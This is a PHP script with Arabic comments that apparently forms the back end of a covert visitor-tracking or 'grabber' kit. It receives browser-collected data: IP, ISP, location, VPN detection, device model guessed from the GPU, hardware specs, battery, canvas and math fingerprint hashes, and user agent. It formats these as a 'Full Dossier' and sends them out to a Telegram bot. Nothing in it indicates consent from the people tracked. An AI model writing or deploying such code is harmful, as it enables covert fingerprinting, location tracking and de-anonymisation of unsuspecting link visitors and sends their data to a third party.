<?php
ignore_user_abort(true);
set_time_limit(10); 

require_once 'config.php';
require_once 'telegram.php';

$json = file_get_contents('php://input');
$d = json_decode($json, true);

if ($d) {
    // تجهيز بيانات الشبكة اللي المتصفح جابها
    $ip = $d['net']['query'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $ip = explode(',', $ip)[0];
    
    $isp = $d['net']['isp'] ?? 'Unknown';
    $loc = isset($d['net']['city']) ? $d['net']['city'] . ", " . $d['net']['country'] : 'Unknown';
    $vpn = isset($d['net']['hosting']) ? ($d['net']['hosting'] ? "نعم (VPN) 🔴" : "لا 🟢") : "Unknown";

    // استنتاج الموديل المخفي لو موجود
    $model = $d['model'] ?? 'Hidden';
    if($model == 'Hidden' && isset($d['gpu']) && strpos($d['gpu'], 'Adreno (TM) 740') !== false) {
        $model = "S23/S24 Ultra (استنتاج)";
    }

    $msg = "⚡ <b>System-X: Full Dossier</b>\n";
    $msg .= "━━━━━━━━━━━━━━\n";
    
    $msg .= "🌍 <b>استخبارات الشبكة:</b>\n";
    $msg .= "• IP: <code>$ip</code>\n";
    $msg .= "• ISP: <code>$isp</code>\n";
    $msg .= "• Location: <code>$loc</code>\n";
    $msg .= "• VPN/Proxy: <b>$vpn</b>\n\n";

    $msg .= "📱 <b>النظام والعتاد:</b>\n";
    $msg .= "• Model: <code>$model</code>\n";
    $msg .= "• CPU: <code>" . ($d['hw']['cores'] ?? '0') . " Cores</code>\n";
    $msg .= "• RAM: <code>" . ($d['hw']['ram'] ?? '0') . " GB</code>\n";
    $msg .= "• GPU: <code>" . ($d['gpu'] ?? 'N/A') . "</code>\n";
    $msg .= "• Battery: <code>" . ($d['bat'] ?? 'N/A') . "</code>\n\n";

    $msg .= "🖥️ <b>تفاصيل الشاشة والبصمات:</b>\n";
    $msg .= "• Res: <code>" . ($d['res'] ?? 'N/A') . "</code> (DPR: " . ($d['dpr'] ?? '1') . ")\n";
    $msg .= "• Theme: <code>" . ($d['theme'] ?? 'N/A') . "</code>\n";
    $msg .= "• Canvas: <code>" . ($d['canvasHash'] ?? 'N/A') . "</code>\n";
    $msg .= "• Math Hash: <code>" . ($d['math'] ?? 'N/A') . "</code>\n\n";

    $msg .= "🌐 <b>المتصفح:</b>\n";
    $msg .= "<code>" . ($d['ua'] ?? 'N/A') . "</code>\n";
    $msg .= "━━━━━━━━━━━━━━\n";
    $msg .= "👨‍💻 <b>Dev: @" . DEV_USERNAME . "</b>";

    sendTelegramMessage($msg);
}
?>
